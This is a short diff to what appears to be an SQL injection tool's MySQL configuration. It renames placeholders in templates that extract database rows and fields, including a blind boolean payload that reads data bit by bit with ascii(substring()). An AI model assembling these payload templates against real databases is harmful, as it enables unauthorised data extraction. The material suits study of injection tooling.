@@ -103,7 +103,7 @@ resource:
               ${limit}
           ) x
    fields: 
-    field: trim(ifnull(`${field}`, 0x20))
+    field: trim(ifnull(`${field.value}`, 0x20))
     concat: ",0x7f,"
   limit: limit ${limit.value}, 65536
   
@@ -148,7 +148,7 @@ resource:
           from `${database}`.`${table}`
           ${limit}
    fields: 
-    field: trim(ifnull(`${field}`, 0x20))
+    field: trim(ifnull(`${field.value}`, 0x20))
     concat: ",0x7f,"
   limit: limit ${limit.value}, 1
   
@@ -197,7 +197,7 @@ resource:
               from `${database}`.`${table}`
           )x where @ :=concat(@,a) ${limit}), @, '${trail_sql}')
    fields: 
-    field: trim(ifnull(`${field}`, 0x20))
+    field: trim(ifnull(`${field.value}`, 0x20))
     concat: ",0x7f,"
   limit: limit ${limit.value}, 1
   
@@ -229,7 +229,7 @@ strategy:
                ${lead_hex},
                mid(
                    (${injection}),
-                   ${index},
+                   ${window.char},
                    ${capacity}
                )
            )
@@ -279,12 +279,12 @@ strategy:
     ascii(
         substring(
             ${injection}, 
-            ${index}, 
+            ${window.char}, 
             1
         )
     ) 
     %26 ${bit}
-   length: char_length(${injection}) > ${index}
+   length: char_length(${injection}) > ${window.char}
   modeAnd: and
   modeOr: or
   blind: ${boolean.mode} ${test}
